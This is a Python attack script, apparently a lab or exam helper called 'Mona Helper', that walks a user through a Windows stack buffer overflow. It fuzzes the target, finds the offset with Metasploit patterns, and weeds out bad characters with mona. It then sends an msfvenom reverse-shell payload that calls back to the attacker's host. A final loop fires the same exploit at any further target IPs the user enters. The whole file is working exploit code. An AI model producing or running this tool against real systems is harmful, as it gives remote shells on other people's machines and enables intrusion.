import socket, time
import subprocess
import argparse

def fuzz(ip, port, timeout, prefix):
    string = prefix + "A" * 100
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except Exception as e:
            print(e)
            print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            return len(string) - len(prefix)
        string += 100 * "A"
        time.sleep(1)


def exploit(ip, port, prefix, offset=0, overflow="A", retn="", padding="", payload="", postfix=""):
    overflow = overflow * offset
    buffer = prefix + overflow + retn + padding + payload + postfix
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Done!")
    except:
        print("Could not connect.")



def main(ip, port, prefix, lhost, lport):
    # Find Overflow
    input("Run '!mona config -set workingfolder c:\\mona\\bufover'")
    overflow = fuzz(ip, port, 5, prefix)

    # Find offset
    overflow_payload = subprocess.run(["/opt/metasploit/tools/exploit/pattern_create.rb", "-l", str(overflow + 400)], capture_output=True, text=True)

    input("Restart the target, press enter to continue")
    exploit(ip, port, prefix, payload=overflow_payload.stdout)

    print(f"Run '!mona findmsp -distance {overflow + 400}' and input the EIP offset:")
    offset = int(input())

    # Find bad chars

    input("Run '!mona bytearray -b \"\\x00\"', press enter to continue")
    input("Restart the target, press enter to continue")

    bad_chars = []
    for x in range(1, 256):
        bad_chars.append(eval("\"\\x" + "{:02x}\"".format(x)))

    exploit(ip, port, prefix, offset, retn="BBBB", payload="".join(bad_chars))
    print("Run '!mona compare -f C:\\mona\\bufover\\bytearray.bin -a [ESP Address]'")

    new_bad = [eval(f"\"{bad.strip()}\"") for bad in input("Input badchars(comma separated): ").split(sep=',')]
    bad_hit = []
    while new_bad[0]:
        bad_hit.extend(new_bad)
        bad_str = ''.join(['\\x{:02x}'.format(ord(bad)) for bad in bad_hit])
        input(f"Run '!mona bytearray -b \"\\x00{bad_str}\"', press enter to continue")

        input("Restart the target, press enter to continue")
        bad_chars = [bad for bad in bad_chars if bad not in new_bad]
        exploit(ip, port, prefix, offset, retn="BBBB", payload=str(''.join(bad_chars)))
        print("Run '!mona compare -f C:\\mona\\bufover\\bytearray.bin -a [ESP Address]'")
        new_bad = [eval(f"\"{bad.strip()}\"") for bad in input("Input badchars(comma separated): ").split(sep=',')]

    bad_str = ''.join(['\\x{:02x}'.format(ord(bad)) for bad in bad_hit])

    while True:
    # Find jmp point
        input(f"Run !mona jmp -r esp -cpb \"\\x00{bad_str}\", press enter to continue")
        jmp = input("Input the jump point address (w/o the 0x prefix): ")
        jmp_little_endian = ""

        for i in reversed([jmp[i:i+2] for i in range(0, len(jmp), 2)]):
            jmp_little_endian += eval(f"\"\\x{i}\"")

        # Exploit
        payload = subprocess.run(["msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "EXITFUNC=thread", "-b", f"\"\\x00{bad_str}\"", "-f", "c"], capture_output=True, text=True)
        print(f"({payload.stdout[23:-2]})")
        payload = eval(f"({payload.stdout[23:-2]})")
        input(f"Start a listener on {lport}, press enter to continue")
        exploit(ip, port, prefix, offset=offset, retn=jmp_little_endian, padding="\x90" * 16, payload=payload)
        if input("Did it work? (Y/n)").lower() != "n":
            break

    while True:
        #Send to other targets
        new_ip = input("Input next target ip: ")
        exploit(new_ip, port, prefix, offset=offset, retn=jmp_little_endian, padding="\x90" * 16, payload=payload)
        if input("Again? (y/N)").lower() != "y":
            break




if __name__=="__main__":
    parser = argparse.ArgumentParser(
                    prog = 'Mona Helper',
                    description = 'Guides the user through Buffer Overflow exploitation with mona')

    parser.add_argument('RHOST')
    parser.add_argument('RPORT', type=int)
    parser.add_argument('prefix')
    parser.add_argument('LHOST')
    parser.add_argument('LPORT')


    args = parser.parse_args()

    main(args.RHOST, args.RPORT, args.prefix, args.LHOST, args.LPORT)